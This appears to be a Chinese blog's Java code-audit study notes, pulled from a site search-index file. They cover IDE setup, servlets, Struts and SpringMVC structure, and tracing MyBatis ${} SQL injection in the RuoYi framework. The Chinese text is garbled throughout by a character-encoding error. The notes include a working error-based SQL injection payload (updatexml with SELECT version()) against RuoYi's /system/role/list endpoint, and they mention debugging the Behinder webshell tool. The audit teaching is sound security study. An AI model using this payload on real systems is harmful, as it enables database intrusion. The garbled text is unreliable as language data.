æŸ¥æ‰¾ä»»ä½•å†…å®¹ï¼Œå¯æœç´¢ç±»ã€èµ„æºã€é…ç½®é¡¹ã€æ–¹æ³•ç­‰ï¼Œè¿˜èƒ½æœç´¢è·¯å¾„|Ctrl + N æŒ‰ç±»åæœç´¢ç±»|Ctrl + F12 æŸ¥çœ‹å½“å‰ç±»ç»“æ„|Ctrl + H æŸ¥çœ‹ç±»çš„å±‚æ¬¡å…³ç³»|Alt + F7 æŸ¥æ‰¾ç±»æˆ–æ–¹æ³•åœ¨å“ªè¢«ä½¿ç”¨ ä¸‹è½½åœ°å€java+idea+tomcatè‡ªå·±æ‰¾ é¡¹ç›®æ–°å»ºæ–°å»ºä¸€ä¸ªæ ‡å‡†é¡¹ç›® åœ¨é¡¹ç›®ç»“æ„ä¸­é…ç½®JDKï¼Œç„¶ååœ¨æ¨¡å—ä¸­é€‰æ‹©æ–°å»ºweb ç„¶åæ·»åŠ artifacts ç„¶åæ–‡ä»¶é…ç½®æŒ‰ç…§å¦‚ä¸‹ ç„¶åè®¾ç½®å°±å·²ç»å¥½äº†ï¼Œä½†æ˜¯javaç‰ˆæœ¬éœ€è¦ä¸‹æœ€æ–°ç‰ˆæœ¬çš„ javawebåŸºç¡€servletjavaæœåŠ¡æ¨¡å—ï¼Œä¸»è¦çš„ä¸šåŠ¡é€»è¾‘å°±æ˜¯ç”¨çš„è¿™ä¸ªæ¨¡å— ideaçš„servletä¸€èˆ¬æ˜¯ç»§æ‰¿httpservletç±» Filterè¿‡æ»¤å™¨æ¨¡å— åˆ›å»ºTargetFilterç±»ï¼š è¦ç‚¹1ï¼šå®ç°javax.servlet.Filteræ¥å£ è¦ç‚¹2ï¼šåœ¨doFilter()æ–¹æ³•ä¸­æ‰§è¡Œè¿‡æ»¤ è¦ç‚¹3ï¼šå¦‚æœæ»¡è¶³è¿‡æ»¤æ¡ä»¶ä½¿ç”¨ chain.doFilter(request, response);æ”¾è¡Œ è¦ç‚¹4ï¼šå¦‚æœä¸æ»¡è¶³è¿‡æ»¤æ¡ä»¶è½¬å‘æˆ–é‡å®šå‘è¯·æ±‚ é™„å¸¦é—®é¢˜ï¼šThymeleafæ¨¡æ¿æ¸²æŸ“ã€‚è¿™é‡Œæˆ‘ä»¬é€‰æ‹©çš„è§£å†³åŠæ³•æ˜¯è·³è½¬åˆ°ä¸€ä¸ªServletï¼Œç”±Servletè´Ÿè´£æ‰§è¡Œæ¨¡æ¿æ¸²æŸ“è¿”å›é¡µé¢ã€‚ listenerç›‘å¬å™¨ ç”¨äºç›‘å¬Webåº”ç”¨ç¨‹åºä¸­çš„ServletContextï¼ŒHttpSession å’ŒHttpServletRequestç­‰åŸŸå¯¹è±¡çš„åˆ›å»ºä¸é”€æ¯äº‹ä»¶ï¼Œä»¥åŠç›‘å¬è¿™äº›åŸŸå¯¹è±¡ä¸­çš„å±æ€§å‘ç”Ÿä¿®æ”¹çš„äº‹ä»¶ã€‚ ThymeleafThymeleafæ˜¯ä¸€ç§æ¨¡æ¿å¼•æ“ï¼Œç›´æ¥åœ¨htmlä¸­çš„ä»»æ„æ ‡ç­¾å‰é¢åŠ ä¸Šth:å³å¯åœ¨åç«¯ä¿®æ”¹å…¶å€¼ è¯¦ç»†çš„ç”¨æ³•å¯ä»¥å‚è€ƒå®˜ç½‘ã€ VueAjaxåœ¨å®é™…åº”ç”¨ä¸­AjaxæŒ‡çš„æ˜¯ï¼šä¸åˆ·æ–°æµè§ˆå™¨çª—å£ï¼Œä¸åšé¡µé¢è·³è½¬ï¼Œå±€éƒ¨æ›´æ–°é¡µé¢å†…å®¹çš„æŠ€æœ¯ã€‚ ä½¿ç”¨åŸç”Ÿçš„JavaScriptç¨‹åºæ‰§è¡ŒAjaxæå…¶ç¹çï¼Œæ‰€ä»¥ä¸€å®šè¦ä½¿ç”¨æ¡†æ¶æ¥å®Œæˆã€‚è€ŒAxioså°±æ˜¯ç›®å‰æœ€æµè¡Œçš„å‰ç«¯Ajaxæ¡†æ¶ã€‚ ä½¿ç”¨Axioså’Œä½¿ç”¨Vueä¸€æ ·ï¼Œå¯¼å…¥å¯¹åº”çš„*.jsæ–‡ä»¶å³å¯ã€‚å®˜æ–¹æä¾›çš„scriptæ ‡ç­¾å¼•å…¥æ–¹å¼ä¸ºï¼š &lt;script src=&quot;https://unpkg.com/axios/dist/axios.min.js&quot;&gt;&lt;/script&gt; Javaè¿œç¨‹è°ƒè¯•Behinder.jaré¦–å…ˆåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥å¦‚ä¸‹ 1java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=10.194.7.167:5005 Behinder.jar ç„¶åå»ideaä¸­æ–°å»ºä¸€ä¸ªé¡¹ç›®ï¼Œæ·»åŠ è¿œç¨‹è°ƒç”¨çš„é…ç½® ç„¶åå°†jaråŒ…æ·»åŠ åˆ°åº“ï¼Œæ‰“ä¸Šæ–­ç‚¹å³å¯è°ƒè¯• æºç https://github.com/super9du/vhr-backend/tree/master https://github.com/JoyChou93/java-sec-code å®¡è®¡æ€è·¯å‚è€ƒé“¾æ¥ï¼šhttps://xz.aliyun.com/t/9173 ç¡®å®šç³»ç»Ÿæ¡†æ¶Struts1 æŸ¥çœ‹web.xmlï¼Œé‡Œé¢æœ‰ä¸€ä¸ªservletå†…å®¹å¦‚ä¸‹ 123&lt;servlet-class&gt; org.apache.struts.action.ActionServlet&lt;/servlet-class&gt; å®ƒçš„è·¯ç”±ä¼šå‡ºç°åœ¨&lt;init-param&gt;ä¸­çš„&lt;param-value&gt;ä¸­çš„é…ç½®æ–‡ä»¶ä¸­ ä¾‹å¦‚struts-config.xmlä¸­çš„ä¸€ä¸ªactionå¦‚ä¸‹ pathå°±æ˜¯è·¯ç”±ï¼Œtypeå°±æ˜¯æœåŠ¡ä»£ç  Struts2å‚è€ƒï¼šhttps://xz.aliyun.com/t/9173 æŸ¥çœ‹web.xmlï¼ŒæŸ¥çœ‹filterï¼Œé‡Œé¢ä¼šæœ‰åä¸ºstrutsçš„è¿‡æ»¤å™¨ struts.xmlæ–‡ä»¶ è¿™ä¸ªæ–‡ä»¶ä¸­æœ‰actionçš„å…·ä½“javaæ–‡ä»¶è·¯å¾„ä¿¡æ¯ å±‚æ¬¡ä»‹ç»actionä¸ºä¸šåŠ¡é€»è¾‘å¤„ç†å±‚ï¼Œactionå±‚æ¥æ”¶æ¥è‡ªè§†å›¾å±‚ï¼ˆ.jspï¼ˆå¯ä»¥ç†è§£ä¸ºå‰ç«¯å§ï¼Œå°±æ˜¯ç”¨æˆ·çœ‹åˆ°æ“ä½œçš„é‚£å±‚ï¼‰ï¼‰çš„è¯·æ±‚ï¼Œå¹¶æ¥æ”¶è¯·æ±‚å‚æ•°ï¼ŒåŒæ—¶è´Ÿè´£è°ƒç”¨æ¨¡å‹Modelå±‚æ–¹æ³•æ¥å®Œæˆä¸šåŠ¡é€»è¾‘çš„å¤„ç†ï¼Œæœ€åæ§åˆ¶ç¨‹åºçš„æµç¨‹ï¼Œé€‰æ‹©ä¸€ä¸ªåˆé€‚çš„è§†å›¾ï¼Œå°†ç»“æœæ˜¾ç¤ºç»™ç”¨æˆ·ï¼Œä¸€èˆ¬è¿™ä¸ªç›®å½•ä¸‹æ–‡ä»¶çš„ç‰¹å¾è¡¨ç°ä¸ºxxxxaction.javaï¼Œæ¯”å¦‚NovyAction.javaï¼› daoä¸ºæ•°æ®æŒä¹…å±‚ï¼Œåœ¨è¿™å±‚ä¸­é€šå¸¸æ˜¯ç”¨æ¥åšæ•°æ®åº“è¯·æ±‚å¤„ç†çš„ï¼Œå¢åˆ æŸ¥æ”¹éƒ½åœ¨è¿™é‡Œï¼Œä¸€èˆ¬è¿™ä¸ªç›®å½•ä¸‹æ–‡ä»¶çš„ç‰¹å¾è¡¨ç°ä¸ºxxxxDao.javaï¼Œæ¯”å¦‚NovyDao.javaã€‚ åœ¨webè¿è¡Œå¤„ç†è¯·æ±‚æ—¶æµç¨‹ä¸ºä¸šåŠ¡é€»è¾‘å¤„ç†å±‚-æ•°æ®æŒä¹…å±‚ SpringMVC å…ˆæŸ¥çœ‹web.xmlï¼Œé‡Œé¢ä¼šæœ‰springMVC æŸ¥çœ‹Springmvc.xmlæŸ¥æ‰¾å„ç§controllerç±»æ‰€åœ¨çš„ä½ç½® æŸ¥çœ‹pom.xmlå„ç§ä¾èµ–çš„å¼•å…¥ å±‚æ¬¡ç»“æ„controllerä¸ºæ§åˆ¶å±‚ï¼ˆä¸šåŠ¡é€»è¾‘ï¼‰ï¼Œç”¨æ¥æ¥æ”¶å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œç„¶åè°ƒç”¨Serviceå±‚ä¸šåŠ¡é€»è¾‘ï¼Œè·å–åˆ°æ•°æ®ï¼Œä¼ é€’æ•°æ®ç»™è§†å›¾å±‚ï¼ˆå®¢æˆ·ç«¯ï¼‰ç”¨äºè§†è§‰å‘ˆç°ï¼Œä¸€èˆ¬è¯·æ±‚çš„urlåœ¨è¿™é‡Œï¼Œæ¯”å¦‚ @Controller@RequestMapping(value &#x3D; â€œ&#x2F;novyâ€) åˆ™è¯·æ±‚urlä¸ºhttp://localhost/novyæ§åˆ¶å±‚çš„æ–‡ä»¶ä¸€èˆ¬ä¸ºxxxcontroller.javaï¼Œæ¯”å¦‚NovyController.java Serviceæ˜¯ä¸šåŠ¡å±‚ï¼Œæ¥æ”¶Controllerå±‚æ•°æ®ï¼Œä¸DAO&#x2F;Mapperå±‚äº¤äº’ï¼Œå¤„ç†ä¸šåŠ¡é€»è¾‘ï¼Œç”ŸæˆresponseDTOæ•°æ®å¹¶è¿”å›Controllerå±‚ ,è¯¥å±‚æ–‡ä»¶ä¸€èˆ¬ä¸ºxxxServce.javaï¼Œæ¯”å¦‚NovyService.javaï¼Œæ­¤å¤„æ˜¯æ¥å£å®šä¹‰ï¼Œå°±æ˜¯å®šä¹‰ä¸€äº›æ–¹æ³•ï¼Œæ²¡æœ‰è¿™äº›æ–¹æ³•çš„å®ç°ï¼Œä½†æ˜¯æœ‰æ—¶å€™æ•°æ®æ“ä½œä¼šåœ¨è¿™é‡Œå‘ç”Ÿï¼ˆçœ‹å¼€å‘ï¼‰ Implementsæ˜¯æœåŠ¡å®ç°å±‚ï¼ˆæ¥å£å®ç°ï¼‰ï¼Œç”¨æ¥å¤„ç†ä¸€äº›æ–¹æ³•çš„å®ç°ï¼ˆè¿™ä¸ªæ–¹æ³•å¹²äº†å•¥å¹²äº†å•¥ï¼‰ï¼Œè¯¥å±‚æ–‡ä»¶ä¸€èˆ¬ä¸ºxxxImpl.javaï¼Œæ¯”å¦‚NovyImpl.javaï¼Œimpl æ˜¯æŠŠmapperå’Œserviceè¿›è¡Œæ•´åˆçš„æ–‡ä»¶ï¼Œæœ‰æ—¶å€™ä¸€äº›sqlæ“ä½œä¹Ÿä¼šå‘ç”Ÿåœ¨è¿™é‡Œ Mapperæ˜¯æ•°æ®æŒä¹…å±‚ï¼Œå¯¹æ•°æ®åº“è¿›è¡Œæ•°æ®æŒä¹…åŒ–æ“ä½œï¼Œä»–çš„æ–¹æ³•è¯­å¥æ˜¯ç›´æ¥é’ˆå¯¹æ•°æ®åº“æ“ä½œçš„ï¼Œæ•°æ®æŒä¹…å±‚æ–‡ä»¶é€šå¸¸éƒ½æ˜¯xxxMapper.xmlï¼Œæ¯”å¦‚NovyMapper.xml Daoæ˜¯æ•°æ®æ¥å£å±‚ï¼Œä¸€äº›æ•°æ®è¯·æ±‚ï¼ˆæ¥å£ï¼‰ä¼šåœ¨è¿™é‡Œå‘ç”Ÿï¼ˆä¸€èˆ¬ç”¨äºå†…éƒ¨å®ç°ï¼‰ Entityæ˜¯å®ä½“å¤„ç†å±‚ï¼Œç”¨äºå­˜æ”¾æˆ‘ä»¬çš„å®ä½“ç±»ï¼Œä¸æ•°æ®åº“ä¸­çš„å±æ€§å€¼åŸºæœ¬ä¿æŒä¸€è‡´ï¼ˆå®šä¹‰å‰ç«¯ä¼ æ¥çš„è¯·æ±‚å‚æ•°ï¼‰ åœ¨webè¿è¡Œæ—¶å¤„ç†è¯·æ±‚çš„æµç¨‹ä¸ºController-&gt;Service-&gt;impl-&gt;mapper Springbootå’Œspringmvcå·®ä¸å¤š SSHæ¡†æ¶struts2+spring+hibernate å¯»æ‰¾sqlæ³¨å…¥æ¼æ´mybatisæ¡†æ¶mybatisä¸€èˆ¬æ˜¯ä½¿ç”¨#&#123;è¿›è¡Œé¢„ç¼–è¯‘ï¼Œä½†æ˜¯åœ¨order byçš„æƒ…å†µä¸‹å¿…é¡»ä½¿ç”¨$&#123;ç›´æ¥æ‹¼æ¥ï¼Œæˆ–è€…æ˜¯ä¸€äº›å…¶ä»–æƒ…å†µä½¿ç”¨äº†$&#123;ï¼Œå°±å¯èƒ½ä¼šå‡ºç°sqlæ³¨å…¥çš„é—®é¢˜ è¿™é‡Œä½¿ç”¨ruoyiæ¡†æ¶ä¸ºä¾‹å­ å®¡è®¡æ–¹æ³• å…¨å±€æœç´¢$&#123;ï¼Œæ–‡ä»¶ç±»å‹é™å®šä¸ºxml![[Pasted image 20241019145616.png]]å¦‚ä¸Šå›¾ï¼Œç›´æ¥ç‚¹è¿›å»ä¸€ä¸ªmapperæ–‡ä»¶æŸ¥çœ‹å³å¯ è¿™é‡Œè¿›å…¥SysRoleMapper.xmlæ–‡ä»¶![[Pasted image 20241019150554.png]] selectæ ‡ç­¾ä¸­çš„idçš„å€¼selectRoleListå°±æ˜¯ç”¨åˆ°è¯¥mapperçš„æ–¹æ³•parameterTypeçš„å€¼SysRoleå°±æ˜¯éœ€è¦ä¼ å…¥çš„å‚æ•°å¯¹è±¡ ç„¶åå°±éœ€è¦å¾€ä¸Šå¯»æ‰¾å…¥å£ç‚¹ å¯»æ‰¾å®šä¹‰selectRoleListæ–¹æ³•çš„javaæ–‡ä»¶ xmlæ–‡ä»¶ä¸€èˆ¬æ˜¯åœ¨resource&#x2F;mapperæ–‡ä»¶å¤¹ä¸­ï¼Œå¯¹åº”çš„mapperåœ¨javaæºä»£ç çš„mapperæ–‡ä»¶å¤¹ä¸­ æ­£å¸¸æ¥è¯´ç›´æ¥ä½¿ç”¨ctrl+ç‚¹å‡»æ–¹æ³•åå°±å¯ä»¥è·³è½¬åˆ°æºæ–‡ä»¶ï¼Œè‹¥æ˜¯æ²¡æœ‰çš„è¯å¯ä»¥ä½¿ç”¨æœç´¢åŠŸèƒ½æ‰¾åˆ°å®šä¹‰è¯¥å‡½æ•°çš„mapperç±»å‹çš„javaæ–‡ä»¶ï¼Œå¦‚ä¸‹ç¬¬ä¸€ä¸ªå°±æ˜¯![[Pasted image 20241019151404.png]] æ‰¾åˆ°implå®ç°æ–‡ä»¶ç›´æ¥ctrl+å•å‡»å³å¯![[Pasted image 20241019151503.png]] å¯»æ‰¾æ¥å£æ–‡ä»¶æ—¢ç„¶æœ‰å®ç°æ–‡ä»¶ï¼Œé‚£ä¹ˆè‚¯å®šä¹Ÿæœ‰æ¥å£æ–‡ä»¶ï¼Œç›´æ¥ç‚¹å‡»ctrl+uå°±å¯ä»¥è·³è½¬åˆ° å¯»æ‰¾å…¥å£æ–‡ä»¶(controller) ä½¿ç”¨æœç´¢åŠŸèƒ½ï¼Œç›´æ¥æœç´¢selectRoleListæ–¹æ³•ï¼Œæ‰¾åˆ°cotrollerç±»å‹çš„æ–‡ä»¶![[Pasted image 20241019152031.png]]SysRoleController.javaæ–‡ä»¶å†…å®¹å¦‚ä¸‹![[Pasted image 20241019152145.png]] å¯ä»¥çœ‹åˆ°æ ¹è·¯ç”±æ˜¯/system/role å¯¹åº”çš„getæ–¹æ³•çš„è·¯ç”±æ˜¯/listï¼Œç„¶åé‡Œé¢æœ‰å‚æ•°roleï¼Œå¯ä»¥çœ‹åˆ°roleçš„ç±»å‹æ˜¯SysRole æœç´¢å‚æ•°å®šä¹‰å…¨å±€æœç´¢SysRoleçš„å®šä¹‰æ–‡ä»¶ ![[Pasted image 20241019152823.png]] SysRole.javaæ–‡ä»¶![[Pasted image 20241019153112.png]] å¯ä»¥å‘ç°ï¼Œç›´æ¥è·å–å€¼ï¼Œå¹¶ä¸”æ²¡æœ‰åšä»»ä½•çš„è¿‡æ»¤ å¿«æ·æ–¹æ³• æŠ“åˆ°xmlæ–‡ä»¶ä¸­çš„å¯èƒ½çš„æ³¨å…¥ç‚¹åï¼Œç›´æ¥ä½¿ç”¨æœç´¢åŠŸèƒ½ï¼Œæ‰¾åˆ°ä½¿ç”¨å¯¹åº”çš„æ–¹æ³•çš„controllerç±»å‹çš„æ–‡ä»¶ï¼Œå’Œå¯¹åº”çš„å‚æ•°ç±»å‹çš„javaæ–‡ä»¶ï¼Œç„¶åç›´æ¥è¿›è¡Œåˆ†æå³å¯ å¯»æ‰¾åç«¯åœ°å€ è‹¥æ˜¯æœ‰åœ¨çº¿çš„é¡¹ç›®ï¼Œç›´æ¥æŠ“åŒ…ç™»å½•çœ‹ä¸€ä¸‹å°±çŸ¥é“äº†ï¼Œè¿˜å¯ä»¥ä»æºç ä¸­çš„application.ymlæ–‡ä»¶ä¸­æŸ¥çœ‹ï¼Œæˆ–è€…æ˜¯vueçš„vue.config.jsæ–‡ä»¶ä¸­ ![[Pasted image 20241019154933.png]] é€šè¿‡ä»¥ä¸Šçš„åˆ†æï¼Œå¯ä»¥å¾—å‡ºæ¼æ´å­˜åœ¨çš„è·¯å¾„æ˜¯ 12127.0.0.1ï¼š8086/system/role/list?roleId=1&amp;roleName-admin&amp;roleKey=1&amp;params[dataScope]=and+updatexml(1,concat(0x7e,(SELECT+version()),0x7e),1)%2523# å¤§è‡´ä¸Šå°±æ˜¯è¿™äº›ï¼Œå‰©ä¸‹çš„å°±ä¸åŠ äº† params[dataScope]è¿™ç§å½¢å¼æ˜¯å› ä¸ºxmlæ–‡ä»¶ä¸­å®šä¹‰æ˜¯$&#123;params.dataScope&#125; Hibernateæ¡†æ¶Hibernateæ¡†æ¶ä¸€èˆ¬æ²¡æœ‰sqlæ³¨å…¥æ¼æ´ï¼Œä¸€èˆ¬éƒ½æ˜¯ä½¿ç”¨å ä½ç¬¦çš„ å®¡è®¡æ–¹æ³• å…³é”®è¯æ£€ç´¢1@Query æœç´¢å®Œåï¼ŒæŸ¥çœ‹æ˜¯å¦æ˜¯ä½¿ç”¨å ä½ç¬¦ï¼Œè‹¥æ˜¯ç›´æ¥æ‹¼æ¥çš„è¯å°±æ˜¯æœ‰æ¼çš„çš„ è‹¥æ˜¯æ‰¾åˆ°æœ‰æ¼æ´çš„sqlæŸ¥è¯¢è¯­å¥ï¼Œä½¿ç”¨å¦‚ä¸‹æ–¹æ³•è·Ÿè¸ªåˆ°controllerå±‚å‡è®¾å¯»æ‰¾findallæ–¹æ³• ctrl+å·¦é”®å•å‡»è¿›å…¥å®ç°ç±» ç„¶åctrl+å·¦é”®ç‚¹å‡»ä¸Šä¸€å±‚çš„æ–¹æ³•findSideè½¬åˆ°controllerç±» å¯ä»¥å‘ç°æ¥å£æ˜¯core/task/view.do","categories":[{"name":"javaå®‰å…¨","slug":"javaå®‰å…¨","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ä»£ç å®¡è®¡/java/ç¬”è®°","slug":"ä»£ç å®¡è®¡-java-ç¬”è®°","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E7%AC%94%E8%AE%B0/"}]}],"categories":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"http://example.com/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"ç½‘ç«™å»ºè®¾","slug":"ç½‘ç«™å»ºè®¾","permalink":"http://example.com/categories/%E7%BD%91%E7%AB%99%E5%BB%BA%E8%AE%BE/"},{"name":"javaå®‰å…¨","slug":"javaå®‰å…¨","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"åº”æ€¥å“åº”/Linux/ç¬”è®°","slug":"åº”æ€¥å“åº”-Linux-ç¬”è®°","permalink":"http://example.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux-%E7%AC%94%E8%AE%B0/"},{"name":"åº”æ€¥å“åº”/Linux/å®æˆ˜","slug":"åº”æ€¥å“åº”-Linux-å®æˆ˜","permalink":"http://example.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux-%E5%AE%9E%E6%88%98/"},{"name":"ç½‘ç«™å»ºè®¾","slug":"ç½‘ç«™å»ºè®¾","permalink":"http://example.com/tags/%E7%BD%91%E7%AB%99%E5%BB%BA%E8%AE%BE/"},{"name":"ä»£ç å®¡è®¡/java/å®æˆ˜","slug":"ä»£ç å®¡è®¡-java-å®æˆ˜","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E5%AE%9E%E6%88%98/"},{"name":"ä»£ç å®¡è®¡/java/ç¬”è®°/ååºåˆ—åŒ–","slug":"ä»£ç å®¡è®¡-java-ç¬”è®°-ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E7%AC%94%E8%AE%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"ä»£ç å®¡è®¡/java/ç¬”è®°","slug":"ä»£ç å®¡è®¡-java-ç¬”è®°","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E7%AC%94%E8%AE%B0/"}]}